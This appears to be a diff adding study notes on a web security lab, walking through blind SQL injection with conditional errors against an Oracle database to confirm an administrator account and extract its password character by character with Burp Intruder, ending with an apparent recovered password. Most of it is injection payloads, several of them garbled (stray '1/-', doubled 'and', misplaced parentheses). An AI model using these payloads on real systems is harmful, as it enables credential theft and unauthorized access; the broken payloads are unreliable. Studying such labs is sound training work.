@@ -1,0 +1,60 @@
+BLIND SQLI WITH CONDITIONAL ERRORS AND ORACLE DB
+
+Analysis:
+ 1. prove the vulnerability
+ 	'
+ 	' || (select '') || ' -> well formated sql querry should be no error
+ 	we get an error, this means may be the db is not mysql but oracle
+
+ 	' || (select '' from dual) || ' -> no error hence its oracle and there is a vulnerability
+ 	' || (select '' from dualfvxcv) || ' ->error
+
+
+ 2. confirm the users table exists in the db:
+ 	' || (select '' from users where rownum =1) || ' -> 200 response status code
+ 	users table exists
+
+ 3. confirm admin user exists in the db users table
+ 	' || (select '' from users where username='administratot') || ' -> wont give conclusive answer since if the user exists or not we get 200 response
+ 	we use the querry below
+
+ 	' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
+ 	This helps in that helps evaluate true statements
+
+ 	' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator') || '
+ 	from part of the statement is executed first then the case if the from statement is false the case wont be executed at all hence helps confirm if the admin really actually exists.
+
+ 	the querry returns an error this confirms administrator user exists this is because the from statement is true, followed by 1=1 which is true but 1/0 is false hence the error
+
+ 	' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='gdjkk;lktzx') || '
+
+ 	if we try with wrong username, it should return 200 status code this is because the from part is false hence the case is not executed, 200 response
+
+ 4.) determine length of password:
+ 	' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator') and LENGTH(password) > 1|| '
+ 	if its bigger than 1 it should return an error (1/0)
+
+ 	' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password) > 50) || '
+ 	no error 200 response hence the pasword is 1< pasword <50
+ 	use burp intruder to find actual length position is the length
+ 	we get 200 response at 20 hence the length of the password is 20
+
+ 5.) Output the admin password
+
+ 	' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator' and substr(password,1,1)='a') || '
+
+ 	if we get 200 response a is not the first character but 500 internal server error will mean a is the first letter
+
+ 	use position and brute forcer
+ 	' || (select CASE WHEN (1=1) THEN TO_CHAR(1/-) ELSE '' END from users where username='administrator') and and substr(password,1,1)='<position1>'|| ' this we get the first letter
+ 	for all the password positions
+ 	' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator') and and substr(password,<position1>,1)='<position2>'|| '
+ 	position 1 is numbers attack type sniper
+ 	position 2 is brute forcer attack type cluster bomb
+ 	run for the full password
+
+
+
+
+2p21gu1bnm5oxbv23gjy
+2p21gu1bnm5oxbv23gjy
